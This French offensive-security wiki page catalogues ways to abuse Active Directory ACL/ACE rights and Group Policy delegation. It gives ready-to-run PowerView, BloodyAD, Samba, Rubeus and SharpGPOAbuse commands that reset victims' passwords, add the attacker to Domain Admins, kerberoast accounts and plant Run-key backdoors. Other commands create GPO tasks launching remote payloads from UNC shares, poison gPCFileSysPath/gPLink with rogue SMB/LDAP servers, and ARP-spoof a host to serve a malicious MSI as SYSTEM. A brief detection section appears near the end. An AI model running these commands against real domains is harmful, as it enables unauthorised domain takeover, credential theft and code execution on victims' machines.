# Abus des ACL/ACE Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Cette page est principalement un résumé des techniques présentées dans** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **et** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Pour plus de détails, consultez les articles d'origine.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

Pour l'abus des ACL d'objets supprimés et la réanimation de comptes, consultez [la réanimation via la corbeille AD](../privileged-groups-and-token-privileges.md#reanimating-a-deleted-account-through-delegated-acls).

## **Droits GenericAll sur un utilisateur**

Ce privilège accorde à un attaquant le contrôle total du compte utilisateur ciblé. Une fois les droits `GenericAll` confirmés à l'aide de la commande `Get-ObjectAcl`, un attaquant peut :

- **Modifier le mot de passe de la cible** : avec `net user <username> <password> /domain`, l'attaquant peut réinitialiser le mot de passe de l'utilisateur.
- Depuis Linux, il est possible de faire la même chose via SAMR avec `net rpc` de Samba :<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Si le compte est désactivé, effacez le flag UAC** : `GenericAll` permet de modifier `userAccountControl`. Depuis Linux, BloodyAD peut supprimer le flag `ACCOUNTDISABLE` :<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting** : attribuer un SPN au compte de l’utilisateur pour le rendre kerberoastable, puis utiliser Rubeus et targetedKerberoast.py pour extraire les hachages du ticket-granting ticket (TGT) et tenter de les casser.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **ASREPRoasting ciblé** : désactivez la pré-authentification pour l’utilisateur, rendant son compte vulnérable à l’ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link** : Avec `GenericAll` sur un utilisateur, vous pouvez ajouter un credential basé sur un certificat et vous authentifier en tant que lui sans changer son mot de passe. Voir :

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Droits GenericAll sur un groupe**

Ce privilège permet à un attaquant de manipuler les appartenances aux groupes s’il dispose des droits `GenericAll` sur un groupe comme `Domain Admins`. Après avoir identifié le nom distinctif du groupe avec `Get-NetGroup`, l’attaquant peut :

- **S’ajouter au groupe Domain Admins** : Cela peut se faire à l’aide de commandes directes ou de modules comme Active Directory ou PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Depuis Linux, vous pouvez également utiliser BloodyAD pour vous ajouter à des groupes arbitraires lorsque vous disposez des droits GenericAll/Write sur leur appartenance. Si le groupe cible est imbriqué dans « Remote Management Users », vous obtiendrez immédiatement un accès WinRM aux hôtes qui reconnaissent ce groupe :<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write sur un ordinateur/utilisateur**

Détenir ces privilèges sur un objet ordinateur ou un compte utilisateur permet de :

- **Kerberos Resource-based Constrained Delegation** : permet de prendre le contrôle d’un objet ordinateur.
- **Shadow Credentials** : utiliser cette technique pour usurper l’identité d’un compte ordinateur ou utilisateur en exploitant les privilèges permettant de créer des shadow credentials.

## Déplacer un objet vers une OU dont il héritera des permissions

Un chemin d’attaque peut combiner des **droits de déplacement sur un compte** et des **droits d’écriture hérités d’une OU de destination**, même si aucun des principaux ne peut initialement modifier les attributs sensibles du compte. Vérifiez les permissions de déplacement de l’objet source et le droit `CreateChild` sur la destination, déplacez l’objet, puis vérifiez à nouveau sa DACL effective. Par exemple, `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` de powerview.py déplace l’utilisateur ; un groupe contrôlé disposant de `GenericWrite` hérité sur cette OU peut ensuite ajouter un [shadow credential](shadow-credentials.md). Le déplacement ne crée pas à lui seul le droit hérité.<sup>[[18]](#references)</sup>

Si vous avez `GenericAll` sur une OU, mais pas d’ACE héritée appropriée, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` peut en ajouter une pour ses descendants. Testez le compte cible séparément : **l’héritage est désactivé pour les comptes protégés par AdminSDHolder**, donc une ACE sur une OU peut affecter les utilisateurs ordinaires tout en échouant sur un utilisateur protégé. Voir [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Une autre voie d’abus existe lorsqu’un script privilégié de nettoyage planifié choisit des OU en fonction d’ACE contrôlées par un attaquant, puis exécute `Set-ADObject -Clear adminCount` **et** `$acl.SetAccessRuleProtection($False, $False)` sur leurs descendants. Si vous pouvez modifier la DACL de l’OU, accordez au groupe inspecté par le script l’ACE `ExtendedRight` ou `GenericAll` requise ; vérifiez séparément que vous pouvez déclencher la tâche. La tâche privilégiée peut alors rétablir l’héritage sur un compte précédemment protégé, ce qui permet à l’ACE de l’OU de s’appliquer. Confirmez le script exact, la permission de déclenchement et la DACL obtenue ; effacer `adminCount` ne réactive pas à lui seul l’héritage, et SDProp peut protéger de nouveau les comptes qui restent dans des groupes protégés.<sup>[[18]](#references)</sup>

## **WriteProperty sur un groupe**

Si un utilisateur dispose de droits `WriteProperty` sur tous les objets d’un groupe spécifique (par exemple, `Domain Admins`), il peut :

- **S’ajouter au groupe Domain Admins** : en combinant les commandes `net user` et `Add-NetGroupUser`, cette méthode permet une élévation de privilèges au sein du domaine.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (auto-adhésion) à un groupe**

Ce privilège permet aux attaquants de s’ajouter eux-mêmes à des groupes spécifiques, tels que `Domain Admins`, à l’aide de commandes qui modifient directement l’appartenance aux groupes. La séquence de commandes suivante permet de s’ajouter soi-même :

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Privilège similaire, il permet aux attaquants de s’ajouter directement à des groupes en modifiant leurs propriétés s’ils disposent du droit `WriteProperty` sur ces groupes. La vérification et l’exploitation de ce privilège s’effectuent avec :

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Détenir l’`ExtendedRight` sur un utilisateur pour `User-Force-Change-Password` permet de réinitialiser son mot de passe sans connaître le mot de passe actuel. La vérification de ce droit et son exploitation peuvent être effectuées avec PowerShell ou d’autres outils en ligne de commande. Plusieurs méthodes permettent de réinitialiser le mot de passe d’un utilisateur, notamment via des sessions interactives et des commandes en une ligne pour les environnements non interactifs. Les commandes vont de simples appels PowerShell à l’utilisation de `rpcclient` sous Linux, illustrant la diversité des vecteurs d’attaque.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner sur un groupe**

Si un attaquant découvre qu’il dispose des droits `WriteOwner` sur un groupe, il peut s’en attribuer la propriété. Cela a un impact particulièrement important lorsque le groupe concerné est `Domain Admins`, car le changement de propriétaire permet de mieux contrôler les attributs et les membres du groupe. La procédure consiste à identifier l’objet approprié avec `Get-ObjectAcl`, puis à utiliser `Set-DomainObjectOwner` pour modifier le propriétaire, par SID ou par nom.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite sur un utilisateur**

Cette permission permet à un attaquant de modifier les propriétés d’un utilisateur. Plus précisément, avec un accès `GenericWrite`, l’attaquant peut modifier le chemin du script d’ouverture de session d’un utilisateur afin d’exécuter un script malveillant lors de sa connexion. Pour cela, il utilise la commande `Set-ADObject` afin de mettre à jour la propriété `scriptpath` de l’utilisateur ciblé et de la faire pointer vers le script de l’attaquant.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Un ACE `WriteProperty` plus restreint, limité à l’attribut [`scriptPath` de l’utilisateur](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), peut suffire ; `GenericWrite` n’est pas nécessaire. Associez ce droit sur l’attribut à un script modifiable dans l’arborescence `SYSVOL\<domain>\scripts` ou `NETLOGON` du domaine, puis évaluez si l’utilisateur cible est susceptible de se connecter et d’accéder au script. Le script s’exécute dans le contexte de cet utilisateur à la connexion. Examinez séparément les ACL effectives AD et les ACL des fichiers et partages ; un ACE Allow correspondant ou un répertoire modifiable ne suffit pas à établir le chemin complet.

## **GenericWrite on Group**

Avec ce privilège, les attaquants peuvent manipuler l’appartenance aux groupes, par exemple en s’ajoutant eux-mêmes ou en ajoutant d’autres utilisateurs à des groupes spécifiques. Ce processus consiste à créer un objet d’identifiants, à l’utiliser pour ajouter ou supprimer des utilisateurs d’un groupe, puis à vérifier les changements d’appartenance à l’aide de commandes PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Depuis Linux, Samba `net` peut ajouter ou supprimer des membres lorsque vous disposez de `GenericWrite` sur le groupe (utile lorsque PowerShell/RSAT ne sont pas disponibles) :<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Posséder un objet AD et disposer de privilèges `WriteDACL` sur celui-ci permet à un attaquant de s’accorder des privilèges `GenericAll` sur l’objet. Pour cela, il manipule ADSI, ce qui lui donne le contrôle total de l’objet et la possibilité de modifier ses appartenances à des groupes. Toutefois, l’exploitation de ces privilèges présente des limites avec les cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Prise de contrôle rapide avec WriteDACL/WriteOwner (PowerView)

Lorsque vous avez `WriteOwner` et `WriteDacl` sur un utilisateur ou un compte de service, vous pouvez en prendre le contrôle total et réinitialiser son mot de passe à l’aide de PowerView sans connaître l’ancien mot de passe :

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notes :
- Vous devrez peut-être d’abord vous définir comme propriétaire si vous disposez uniquement de `WriteOwner` :

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Validez l’accès avec n’importe quel protocole (SMB/LDAP/RDP/WinRM) après la réinitialisation du mot de passe.

## **Réplication sur le domaine (DCSync)**

L’attaque DCSync exploite des autorisations de réplication spécifiques sur le domaine pour se faire passer pour un contrôleur de domaine et synchroniser des données, notamment les identifiants des utilisateurs. Cette technique puissante nécessite des autorisations telles que `DS-Replication-Get-Changes`, qui permettent aux attaquants d’extraire des informations sensibles de l’environnement AD sans accéder directement à un contrôleur de domaine.<sup>[[5]](#references)</sup> [**En savoir plus sur l’attaque DCSync ici.**](../dcsync.md)

## Délégation GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Délégation GPO

Un accès délégué à la gestion des objets de stratégie de groupe (GPO) peut présenter des risques importants pour la sécurité. Par exemple, si un utilisateur tel que `offense\spotless` dispose de droits délégués de gestion des GPO, il peut bénéficier de privilèges tels que **WriteProperty**, **WriteDacl** et **WriteOwner**. Ces autorisations peuvent être exploitées à des fins malveillantes, comme le montre PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Énumérer les autorisations GPO

Pour identifier les GPO mal configurées, il est possible d’enchaîner les cmdlets de PowerSploit. Cela permet de découvrir les GPO qu’un utilisateur donné est autorisé à gérer : `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Ordinateurs auxquels une stratégie donnée est appliquée** : Il est possible de déterminer quels ordinateurs sont concernés par une GPO spécifique, afin de comprendre l’étendue de son impact potentiel. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Stratégies appliquées à un ordinateur donné** : Pour voir quelles stratégies sont appliquées à un ordinateur donné, des commandes comme `Get-DomainGPO` peuvent être utilisées.

**UO auxquelles une stratégie donnée est appliquée** : Les unités organisationnelles (UO) concernées par une stratégie donnée peuvent être identifiées avec `Get-DomainOU`.

Vous pouvez également utiliser l’outil [**GPOHound**](https://github.com/cogiceo/GPOHound) pour énumérer les GPO et y repérer les problèmes.

### Exploiter une GPO - New-GPOImmediateTask

Les GPO mal configurées peuvent être exploitées pour exécuter du code, par exemple en créant une tâche planifiée immédiate. Cette méthode peut servir à ajouter un utilisateur au groupe des administrateurs locaux sur les machines concernées, ce qui augmente considérablement ses privilèges :

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### Module GroupPolicy - Abus de GPO

Le module GroupPolicy, s’il est installé, permet de créer et de lier de nouveaux GPO, ainsi que de définir des préférences, comme des valeurs de registre, pour exécuter des backdoors sur les ordinateurs concernés. Cette méthode nécessite que le GPO soit mis à jour et qu’un utilisateur se connecte à l’ordinateur pour déclencher l’exécution :

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Abuser les GPO

SharpGPOAbuse permet d’abuser des GPO existantes en y ajoutant des tâches ou en modifiant leurs paramètres, sans avoir à en créer de nouvelles. Cet outil nécessite de modifier des GPO existantes ou d’utiliser les outils RSAT pour en créer de nouvelles avant d’appliquer les changements :

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Forcer la mise à jour des stratégies

Les mises à jour des GPO ont généralement lieu environ toutes les 90 minutes. Pour accélérer ce processus, notamment après avoir effectué une modification, la commande `gpupdate /force` peut être exécutée sur l’ordinateur cible afin de forcer une mise à jour immédiate des stratégies. Cette commande garantit que les modifications apportées aux GPO sont appliquées sans attendre le prochain cycle de mise à jour automatique.

### Sous le capot

L’inspection des tâches planifiées d’une GPO donnée, comme la `Misconfigured Policy`, permet de confirmer l’ajout de tâches telles que `evilTask`. Ces tâches sont créées à l’aide de scripts ou d’outils en ligne de commande visant à modifier le comportement du système ou à élever les privilèges.

La structure de la tâche, telle qu’elle apparaît dans le fichier de configuration XML généré par `New-GPOImmediateTask`, précise les détails de la tâche planifiée, notamment la commande à exécuter et ses déclencheurs. Ce fichier montre comment les tâches planifiées sont définies et gérées dans les GPO et permet d’exécuter des commandes ou des scripts arbitraires dans le cadre de l’application des stratégies.

### Utilisateurs et groupes

Les GPO permettent également de modifier les appartenances aux groupes et aux utilisateurs sur les systèmes cibles. En modifiant directement les fichiers de stratégie Utilisateurs et groupes, les attaquants peuvent ajouter des utilisateurs à des groupes privilégiés, comme le groupe local `administrators`. C’est possible lorsque des permissions de gestion des GPO sont déléguées, ce qui permet de modifier les fichiers de stratégie pour y ajouter de nouveaux utilisateurs ou changer les appartenances aux groupes.

Le fichier de configuration XML pour Utilisateurs et groupes indique comment mettre en œuvre ces modifications. L’ajout d’entrées à ce fichier permet d’accorder des privilèges élevés à certains utilisateurs sur les systèmes concernés. Cette méthode offre un moyen direct d’élever les privilèges en manipulant les GPO.

Pour les paramètres de sécurité tels que l’appartenance aux groupes locaux et les droits des utilisateurs, inspectez également le modèle GPO appliqué à l’emplacement `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` ainsi que l’ACL du répertoire `SecEdit`. Un répertoire ou un fichier accessible en écriture constitue une piste à examiner : l’accès effectif au partage SYSVOL, les règles de refus et les ACL héritées, les permissions du conteneur de stratégie de groupe, la portée de la stratégie et l’actualisation côté client déterminent toujours si une modification peut prendre effet. L’appartenance à un groupe nommé « GPO Managers » ne confère pas à elle seule des droits de modification. [Microsoft documente le chemin de ce modèle et la distinction entre le conteneur de stratégie de groupe et le modèle.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

D’autres méthodes d’exécution de code ou de maintien de la persistance peuvent également être envisagées, par exemple l’exploitation des scripts de connexion/déconnexion, la modification des clés de registre utilisées pour le lancement automatique, l’installation de logiciels à l’aide de fichiers .msi ou la modification des configurations de services. Ces techniques offrent divers moyens de maintenir l’accès aux systèmes cibles et de les contrôler en abusant des GPO.

### Rediriger la récupération GPC/GPT vers des services frauduleux authentifiés

Une GPO est composée d’un **conteneur de stratégie de groupe (GPC)** LDAP contenant des métadonnées et d’un **modèle de stratégie de groupe (GPT)** hébergé sur SMB et contenant les fichiers de stratégie. Lors de l’actualisation, le client suit le `gPLink` du conteneur, lit le GPC référencé et son `gPCFileSysPath`, puis télécharge le GPT depuis ce chemin UNC. Par conséquent, un accès en écriture au GPC lui-même ou au `gPLink` d’une OU, d’un site ou d’un domaine peut permettre de déclencher le traitement privilégié d’une stratégie.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Empoisonnement de `gPCFileSysPath` avec GPOddity

Si le principal contrôlé peut modifier le GPC cible (directement ou par **NTLM relay to LDAP**), remplacez `gPCFileSysPath` par un chemin UNC hébergé par l’attaquant. [GPOddity](https://github.com/synacktiv/GPOddity) automatise la modification LDAP et héberge un GPT malveillant contenant des fichiers de stratégie basés sur des modules ou une Immediate Task que le client de stratégie de groupe exécute en tant que `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Un partage SMB anonyme ou indépendant des identifiants ne suffit pas avec les clients Windows actuels : SMB Secure Negotiate exige une preuve de réussite de l’authentification. Le service frauduleux doit donc valider l’identité du domaine, dériver la clé de session SMB et signer correctement ses réponses. En mode embarqué, configurez GPOddity avec un compte machine contrôlé et sa clé de service, puis sélectionnez une charge utile côté ordinateur ou côté utilisateur dans la section `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Cas limite GPO utilisateur :** après MS16-072, Windows crée toujours deux sessions SMB2 dans la **même connexion TCP** : la session utilisateur lit `GPT.INI`, puis la session du compte ordinateur lit la configuration effective, telle que `ScheduledTasks.xml`. Un serveur malveillant doit donc indexer l’état d’authentification, les clés de session et les clés de signature par `SessionId` SMB2, et pas seulement par socket. Le fork de Scapy intégré à GPOddity/OUned implémente cela via `SMBStreamSocketMultiplexing` et un `SMBServer` compatible avec le multiplexage ; les serveurs Impacket/Scapy à session unique réutilisent sinon le mauvais état de signature et échouent avec les stratégies utilisateur.<sup>[[15]](#references)</sup>

#### Empoisonnement de `gPLink` avec OUned

Avec `WriteGPLink`, `GenericWrite` ou un contrôle équivalent sur une OU, un Site ou un Domain, un attaquant peut ajouter un lien dont le DN GPC est hébergé par un serveur LDAP contrôlé par l’attaquant. Cette primitive a été présentée à l’origine par Petros Koutroumpis ; [OUned](https://github.com/synacktiv/OUned) automatise l’écriture LDAP et la chaîne GPC/GPT malveillante.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

La victime s’authentifie d’abord auprès du service LDAP malveillant et reçoit un GPC dont le `gPCFileSysPath` pointe vers le service SMB malveillant ; elle s’authentifie ensuite auprès de SMB et applique le GPT fourni. OUned a donc besoin d’un compte avec un SPN LDAP, d’un compte machine avec un SPN HOST pour SMB (le même compte machine peut satisfaire les deux besoins) et d’une résolution DNS ou d’une redirection inverse qui achemine les ports 389 et 445 vers l’hôte de l’opérateur.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

Le serveur LDAP Scapy intégré d'OUned valide Kerberos/SPNEGO avec la véritable clé de service contrôlée et fournit des données GPC arbitraires depuis JSON. La clé JSON vide représente rootDSE, les préfixes `base64:` représentent des valeurs binaires, et le serveur prend en charge les opérations add/delete/modify/search ainsi que les recherches `BASE`, `LEVEL` et `SUBTREE` ; il peut négocier l'absence de protection, l'intégrité ou la confidentialité. Le service est ainsi réutilisable lorsqu'un autre composant Windows suit une référence LDAP contrôlée par un attaquant tout en exigeant une authentification LDAP.<sup>[[15]](#references)</sup>

Ne partez pas du principe que la synchronisation du mot de passe d'un compte vers un domaine factice reproduit toutes les clés Kerberos : RC4 est dérivé du mot de passe, tandis que la fonction de dérivation de clé AES utilise également un salt dérivé du nom d'hôte/domaine du principal. Fournir la véritable clé AES du compte à `KerberosSSP` évite de forcer RC4 en modifiant de manière détectable `msDS-SupportedEncryptionTypes`, attribut que le compte machine peut modifier lui-même.<sup>[[15]](#references)</sup>

#### Pistes de détection

Corrélez les modifications de `gPCFileSysPath` ou `gPLink` avec les changements de version GPO et les nouveaux fichiers XML Immediate/Scheduled Task. Examinez les liens vers des contextes de nommage inattendus, les hôtes UNC situés en dehors de l'ensemble DC/SYSVOL autorisé, les enregistrements DNS redirigeant les noms de comptes machine, les tickets de service LDAP/CIFS pour des comptes machine inhabituels et les modifications de `msDS-SupportedEncryptionTypes` qui activent RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` sur une OU/un domaine permet de modifier l'attribut `gPLink` du conteneur cible et de **forcer l'application d'un GPO existant** sans modifier le GPO lui-même. C'est intéressant lorsque le GPO lié référence déjà du contenu distant via des **chemins UNC** (`\\HOST\share\...`), car les utilisateurs authentifiés peuvent lire **SYSVOL** et rechercher hors ligne des stratégies réutilisables.<sup>[[11]](#references)</sup>

Déroulement général :

1. Utilisez BloodHound pour identifier un principal disposant de `WriteGPLink` sur une OU et énumérez les ordinateurs/utilisateurs de cette OU.
2. Clonez `SYSVOL` en lecture seule et analysez les GPO à la recherche de **Software Installation**, de **mappages de lecteurs** (`Drives.xml`) et de **scripts de connexion/démarrage** faisant référence à des chemins UNC.
3. Privilégiez les stratégies pointant vers un **nom d'hôte direct** (par exemple `\\DC02\share\pkg.msi`) plutôt que vers des chemins DFS/espaces de noms de domaine, car les chemins basés sur un nom d'hôte sont plus faciles à rediriger par spoofing L2.
4. Ajoutez le GUID du GPO choisi au `gPLink` de l'OU cible afin que la victime traite cette stratégie déjà existante.
5. Sur le même domaine de diffusion, effectuez un ARP spoofing de l'hôte UNC et associez son IP localement (`ip addr add <target_ip>/32 dev <iface>`) afin que le trafic SMB de la victime atteigne votre hôte.
6. Servez le chemin/nom de fichier attendu depuis un serveur SMB contrôlé par l'attaquant (par exemple `smbserver.py`) et attendez le traitement normal de la stratégie.

Exemple de collecte de `SYSVOL` et de corrélation des GPO :

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Liez le GPO existant à l’OU cible :

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Détournement UNC de Software Installation -> SYSTEM

Si le GPO lié déploie un MSI depuis un chemin UNC, le client le récupérera au **démarrage de l’ordinateur** et l’installera en tant que **`NT AUTHORITY\SYSTEM`**. En usurpant l’hôte référencé et en hébergeant un MSI malveillant au **même partage/chemin/nom**, vous pouvez transformer `WriteGPLink` en exécution de code SYSTEM **sans modifier SYSVOL**.

Contraintes importantes :

- **Le timing compte** : le nouveau lien est pris en compte lors de l’actualisation de la stratégie (généralement toutes les ~90 minutes), mais **Software Installation** se déclenche généralement au **redémarrage**.
- Windows Installer suit généralement le déploiement à l’aide du **`ProductCode`** du package. Si le produit est déjà installé, le déploiement peut être ignoré.
- Pour éviter le rejet par le programme d’installation, modifiez le MSI malveillant afin que son **`ProductCode`** et son **`PackageCode`** correspondent à ceux du package légitime attendu par le GPO.
- D’anciens fichiers d’annonce `.aas` peuvent rester dans `SYSVOL` : vérifiez donc que le déploiement semble toujours actif avant de vous y fier.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Hijack de chemin UNC de lecteur réseau -> capture NTLM / relay WebDAV

Les mappages de lecteurs GPP dans `Drives.xml` amènent les utilisateurs à s’authentifier auprès du chemin UNC configuré lors de l’ouverture de session ou de la reconnexion. Si vous usurpez l’hôte référencé, vous pouvez capturer du **NetNTLMv2**. Si SMB est délibérément configuré pour échouer, Windows peut réessayer via **WebDAV** et envoyer du **NTLM sur HTTP**, ce qui offre beaucoup plus de possibilités de relay vers **LDAP(S)**, **AD CS** ou **SMB**.

#### Hijack UNC de script d’ouverture de session/de démarrage

Le même principe s’applique aux scripts hébergés sur UNC et découverts dans `SYSVOL` :

- Les **scripts d’ouverture de session** s’exécutent généralement dans le contexte de l’**utilisateur**.
- Les **scripts de démarrage** s’exécutent généralement dans le contexte de l’**ordinateur / SYSTEM**.

Si le chemin du script pointe vers un nom d’hôte usurpable, redirigez l’hôte UNC et servez le contenu d’un script de remplacement depuis l’emplacement attendu.

## Empoisonnement des scripts d’ouverture de session SYSVOL/NETLOGON

Les chemins inscriptibles sous `\\<dc>\SYSVOL\<domain>\scripts\` ou `\\<dc>\NETLOGON\` permettent de modifier les scripts d’ouverture de session exécutés lors de l’ouverture de session des utilisateurs via GPO. Cela permet l’exécution de code dans le contexte de sécurité des utilisateurs qui se connectent.

### Localiser les scripts d’ouverture de session
- Examinez les attributs utilisateur pour repérer un script d’ouverture de session configuré :

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Parcourez les partages du domaine pour repérer des raccourcis ou des références à des scripts :

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

